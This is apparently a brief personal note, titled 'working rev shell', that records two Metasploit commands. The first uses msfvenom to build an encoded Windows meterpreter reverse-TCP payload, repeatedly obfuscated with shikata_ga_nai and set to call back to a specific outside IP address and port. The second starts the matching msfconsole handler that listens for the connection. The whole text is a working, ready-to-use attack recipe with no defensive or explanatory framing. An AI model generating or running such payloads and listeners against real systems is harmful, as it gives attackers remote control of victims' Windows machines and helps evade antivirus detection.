11/29/2024 - working rev shell

created x86 payload:
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.58.127.74 LPORT=8448 -b "\x00\x0a\x0d" -f c -e x86/shikata_ga_nai -i 5 EXITFUNC=thr
	ead PrependSetuid=True > reverse
	
x86 listener:
    msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 198.58.127.74; set lport 8448; exploit"